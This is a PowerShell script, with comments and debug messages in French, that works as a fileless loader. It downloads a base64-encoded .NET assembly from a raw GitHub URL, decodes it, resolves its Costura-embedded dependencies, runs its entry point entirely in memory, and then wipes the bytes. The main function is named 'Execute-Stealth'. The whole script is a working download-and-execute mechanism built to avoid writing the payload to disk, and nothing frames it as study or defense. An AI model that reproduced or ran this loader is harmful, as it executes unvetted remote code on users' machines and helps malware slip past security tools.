[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    # IMPORTANT: Ajouter le handler AVANT de charger l'assembly
    $script:mainAssembly = $null
    
    $onAssemblyResolve = {
        param($sender, $e)
        $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
        Write-Host "[AssemblyResolve] Recherche: $assemblyName" -ForegroundColor Magenta
        
        if ($script:mainAssembly -ne $null) {
            $resourceNames = $script:mainAssembly.GetManifestResourceNames()
            Write-Host "[AssemblyResolve] Ressources disponibles: $($resourceNames.Count)" -ForegroundColor Cyan
            
            # Chercher toutes les variantes possibles
            $resourceName = $resourceNames | Where-Object { 
                $_ -like "costura.$assemblyName.dll.compressed" -or 
                $_ -like "costura.$assemblyName.dll" -or
                $_ -like "costura.$($assemblyName.Replace('.', '_'))*.dll.compressed" -or
                $_ -like "costura.$($assemblyName.Replace('.', '_'))*.dll"
            } | Select-Object -First 1
            
            if ($resourceName) {
                Write-Host "[AssemblyResolve] Ressource trouvee: $resourceName" -ForegroundColor Green
                try {
                    $stream = $script:mainAssembly.GetManifestResourceStream($resourceName)
                    if ($stream -ne $null) {
                        if ($resourceName.EndsWith(".compressed")) {
                            $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
                            $memoryStream = New-Object System.IO.MemoryStream
                            $deflateStream.CopyTo($memoryStream)
                            $assemblyBytes = $memoryStream.ToArray()
                            $deflateStream.Close()
                            $memoryStream.Close()
                        } else {
                            $assemblyBytes = New-Object byte[] $stream.Length
                            $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                        }
                        $stream.Close()
                        Write-Host "[AssemblyResolve] Assembly charge avec succes!" -ForegroundColor Green
                        return [System.Reflection.Assembly]::Load($assemblyBytes)
                    }
                } catch {
                    Write-Host "[AssemblyResolve] ERREUR: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "[AssemblyResolve] Ressource NON trouvee pour: $assemblyName" -ForegroundColor Yellow
            }
        } else {
            Write-Host "[AssemblyResolve] mainAssembly est null!" -ForegroundColor Red
        }
        return $null
    }
    
    [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
    Write-Host "[DEBUG] Handler AssemblyResolve ajoute" -ForegroundColor Cyan
    
    # Maintenant charger l'assembly (le handler sera appele si besoin)
    $script:mainAssembly = [System.Reflection.Assembly]::Load($bytes)
    Write-Host "[DEBUG] Assembly charge, ressources Costura: $($script:mainAssembly.GetManifestResourceNames() | Where-Object { $_ -like 'costura.*' } | ForEach-Object { $_ } | Out-String)" -ForegroundColor Cyan
    
    # Essayer de declencher l'initialisation de Costura manuellement
    try {
        $costuraType = $script:mainAssembly.GetType("Costura.AssemblyLoader")
        if ($costuraType -ne $null) {
            $attachMethod = $costuraType.GetMethod("Attach", [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)
            if ($attachMethod -ne $null) {
                $attachMethod.Invoke($null, $null)
            }
        }
    } catch {
        # Costura s'initialisera via notre handler
    }

    $entryPoint = $script:mainAssembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"

Execute-Stealth -url $url
